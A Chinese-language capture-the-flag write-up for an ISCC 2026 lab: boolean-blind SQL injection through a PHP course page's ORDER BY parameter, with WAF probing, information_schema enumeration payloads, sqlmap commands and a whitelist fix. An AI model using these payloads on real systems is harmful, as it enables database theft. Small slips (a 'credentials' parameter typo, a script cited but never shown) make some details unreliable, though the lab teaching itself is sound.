# ISCC 2026 - 内网服务漏洞利用 WriteUp

## 一、题目信息

| 项目 | 内容 |
|------|------|
| 题目 | 内网服务漏洞利用 |
| 靶场 | 10.119.6.32:8099 |
| 环境 | Apache/2.4.54 (Debian) + PHP/7.4.33 + MySQL |
| 入口 | `http://10.119.6.32:8099/course.php?sortOrder=credits` |
| Flag格式 | `iscc2026{xxx}` |

## 二、信息收集

访问首页 `http://10.119.6.32:8099/`，页面是一个课程管理系统：

```html
排序方式：
<a href="course.php?sortOrder=id">按编号</a>
<a href="course.php?sortOrder=name">按名称</a>
<a href="course.php?sortOrder=teacher">按教师</a>
<a href="course.php?sortOrder=credits">按学分</a>
```

页面通过 JS fetch `course.php?sortOrder=id` 获取JSON数据：

```json
[{"id":"1","name":"Database Systems","teacher":"Prof. Zhang","credits":"3"}, ...]
```

响应头确认技术栈：
```
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
```

## 三、SQL注入发现

### 3.1 注入点定位

`sortOrder` 参数直接拼接到 SQL 的 `ORDER BY` 子句。后端代码推测为：

```php
$sortOrder = $_GET['sortOrder'];
$sql = "SELECT id, name, teacher, credits FROM course ORDER BY " . $sortOrder;
```

四个合法值 (`id`, `name`, `teacher`, `credits`) 对应四个字段名，说明参数直接控制 `ORDER BY` 的排序列。

### 3.2 注入验证步骤

**第1步：单引号测试 — 确认SQL错误可控**

```
GET /course.php?sortOrder=id'
→ {"error":"Query failed"}
```

单引号破坏了SQL语法，证明参数被直接拼接，未使用预编译。

**第2步：ORDER BY 特性确认 — 确定注入点在 ORDER BY 子句**

```
GET /course.php?sortOrder=id desc
→ 返回按id降序排列的数据
```

`DESC` 关键字生效，说明我们可以在 ORDER BY 子句后追加任意SQL片段。

**第3步：布尔盲注验证 — 确认可以执行条件判断**

```
?sortOrder=(CASE WHEN (1=1) THEN id ELSE name END)
→ 返回按id排序（条件为真）

?sortOrder=(CASE WHEN (1=2) THEN id ELSE name END)
→ 返回按name排序（条件为假）
```

| 条件 | 排序字段 | 首条id | 含义 |
|------|---------|--------|------|
| `1=1` (TRUE) | `id` | 1 | 条件为真时按id排 |
| `1=2` (FALSE) | `name` | 2 | 条件为假时按name排 |

**这就是布尔盲注的依据：看返回JSON的第一条记录的id是"1"还是"2"，就知道SQL条件是TRUE还是FALSE。**

## 四、WAF/过滤检测与绕过

### 4.1 过滤测试

```
?sortOrder=id'                          → Query failed    （单引号触发错误）
?sortOrder=id UNION SELECT 1,2,3,4--    → Query failed    （UNION被拦截）
?sortOrder=id,extractvalue(1,concat(0x7e,database())) → Query failed （报错函数被拦）
?sortOrder=id,updatexml(1,concat(0x7e,database()),1)    → Query failed
?sortOrder=id,sleep(2)                  → 无延迟           （SLEEP被过滤或无效）
?sortOrder=id AND 1=1                   → 正常返回         （AND可以写）
?sortOrder=(SELECT 1)                   → 正常返回         （子查询可以写）
?sortOrder=(CASE WHEN ... THEN ... END) → 正常返回         （CASE WHEN可用）
```

### 4.2 过滤分析

| 技术 | 状态 | 原因 |
|------|------|------|
| UNION SELECT | 被拦截 | 关键字过滤 |
| extractvalue / updatexml | 被拦截 | 报错函数过滤 |
| SLEEP延时注入 | 被过滤 | 延时函数过滤 |
| CASE WHEN 布尔盲注 | **可用** | 未被过滤 |

### 4.3 绕过策略

**放弃报错注入和延时注入，使用纯布尔盲注。** `CASE WHEN` 是SQL标准语法，不是攻击特征函数，WAF很难在不破坏正常业务的前提下过滤它。布尔盲注不需要触发报错，也不产生延时，完全通过业务逻辑的差异（排序结果不同）来判断条件真假，隐蔽性最高。

## 五、数据库类型确认

在上一步已经确认SQL注入可用后，需要判断后端数据库类型，因为不同数据库的系统表名不同。

```
?sortOrder=(CASE WHEN (select count(*) from information_schema.tables)>0 THEN id ELSE name END)
→ 返回按id排序（TRUE）
```

`information_schema.tables` 是 MySQL 的系统表，确认数据库为 **MySQL**。

## 六、为什么要找表名

Flag/Key 一定存储在某张数据库表中。已知业务表是 `course`（存课程数据），但flag通常不会放在业务表里，而是单独存一张表（如 `flag`、`key`、`secret` 等）。MySQL 的 `information_schema` 数据库记录了所有库、表、列的结构信息，通过查询它就能枚举出整库的表结构，找到flag藏在哪。

## 七、数据提取过程

### 7.1 提取数据库名

```sql
-- 步骤1: 获取数据库名长度
(CASE WHEN (LENGTH(DATABASE())=8) THEN id ELSE name END)
→ TRUE，数据库名长度为8

-- 步骤2: 逐字符提取
(CASE WHEN (SUBSTR(DATABASE(),1,1)='s') THEN id ELSE name END) → TRUE
(CASE WHEN (SUBSTR(DATABASE(),2,1)='u') THEN id ELSE name END) → TRUE
...
→ 数据库名: subjects
```

### 7.2 提取表名

```sql
-- 步骤1: 获取表的数量
(CASE WHEN ((SELECT COUNT(*) FROM information_schema.tables
  WHERE table_schema='subjects')=2) THEN id ELSE name END)
→ TRUE，共2张表

-- 步骤2: 逐表提取表名
(SELECT table_name FROM information_schema.tables
 WHERE table_schema='subjects' LIMIT 0,1)
→ 表1: course (长度6)

(SELECT table_name FROM information_schema.tables
 WHERE table_schema='subjects' LIMIT 1,1)
→ 表2: flag (长度4)
```

### 7.3 提取列名

```sql
-- 查course表的列
(SELECT column_name FROM information_schema.columns
 WHERE table_schema='subjects' AND table_name='course' LIMIT 0,1) → id
...LIMIT 1,1 → name
...LIMIT 2,1 → teacher
...LIMIT 3,1 → credits

-- 查flag表的列
(SELECT column_name FROM information_schema.columns
 WHERE table_schema='subjects' AND table_name='flag' LIMIT 0,1) → id
...LIMIT 1,1 → flag       ← 目标列！
...LIMIT 2,1 → updated_at
```

### 7.4 提取Flag

```sql
-- 确认只有1行数据
(CASE WHEN ((SELECT COUNT(*) FROM flag)=1) THEN id ELSE name END) → TRUE → TRUE

-- 获取flag长度
(CASE WHEN (LENGTH((SELECT flag FROM flag LIMIT 0,1))=42) THEN id ELSE name END)
→ TRUE，flag长度为42

-- 逐字符提取（使用ORD二分查找加速，每字符仅需6-7次请求）
(CASE WHEN (ORD(SUBSTR((SELECT flag FROM flag LIMIT 0,1),1,1))>=79) THEN id ELSE name END)
→ FALSE → hi=78
(CASE WHEN (ORD(SUBSTR((SELECT flag FROM flag LIMIT 0,1),1,1))>=55) THEN id ELSE name END)
→ TRUE → lo=56
...
→ ORD=105 → 'i'

-- 逐位提取完成
→ iscc2026{441d1bThi51sECB128Key~1778382001}
```

## 八、SQLMap 使用方法

sqlmap 可直接用于此注入点：

```bash
# 1. 检测注入
sqlmap -u "http://10.119.6.32:8099/course.php?sortOrder=credits" \
  --level=3 --risk=3 --dbms=mysql --batch

# 2. 获取数据库名
sqlmap -u "http://10.119.6.32:8099/course.php?sortOrder=credits" \
  --dbs --batch

# 3. 获取subjects库的表
sqlmap -u "http://10.119.6.32:8099/course.php?sortOrder=credits" \
  -D subjects --tables --batch

# 4. 获取flag表的列
sqlmap -u "http://10.119.6.32:8099/course.php?sortOrder=credentials" \
  -D subjects -T flag --columns --batch

# 5. 导出flag列数据
sqlmap -u "http://10.119.6.32:8099/course.php?sortOrder=credits" \
  -D subjects -T flag -C flag --dump --batch
```

**参数说明：**
- `--level=3`：提高检测深度，探测更多注入类型（默认level=1不会测ORDER BY注入）
- `--risk=3`：启用更激进的测试payload（包括ORD()等函数）
- `--dbms=mysql`：指定数据库类型，加快检测速度
- `--batch`：使用默认选项，无需交互
- `--technique=B`：可指定只测布尔盲注（Boolean-based blind），跳过其他类型加快速度

**注意：** sqlmap抽取数据较慢（逐字符二分约每秒1字符），flag有时间戳会动态变化，建议用上面的手写脚本（17秒完成）而非sqlmap。

## 九、漏洞原理总结

```
用户输入: sortOrder=credits
         ↓
PHP拼接:  SELECT id, name, teacher, credits FROM course ORDER BY credits
         ↓
攻击输入: (CASE WHEN (条件) THEN id ELSE name END)
         ↓
SQL执行:  SELECT ... FROM course ORDER BY (CASE WHEN (条件) THEN id ELSE name END)
         ↓
结果差异: 条件为TRUE → 按id排序(首条id=1)
          条件为FALSE → 按name排序(首条id=2)
         ↓
盲注利用: 每次请求判断一个比特信息，逐位提取数据库内容
```

核心问题：**ORDER BY 子句支持任意表达式和子查询**，而开发者直接将用户输入拼接到该位置，导致攻击者可以注入CASE WHEN条件表达式，利用排序结果的差异构造布尔盲注。

## 十、修复方案

```php
// 正确做法：白名单映射
$allowed = ['id', 'name', 'teacher', 'credits'];
$sortOrder = in_array($_GET['sortOrder'], $allowed) ? $_GET['sortOrder'] : 'id';
$sql = "SELECT id, name, teacher, credits FROM course ORDER BY " . $sortOrder;
```

## 十一、Flag

```
iscc2026{441d1bThi51sECB128Key~1778382001}
```

> **注意：** flag末尾为10位动态时间戳，会随时间变化。如提交失败需重新运行 `exploit_fast.py` 提取最新值。
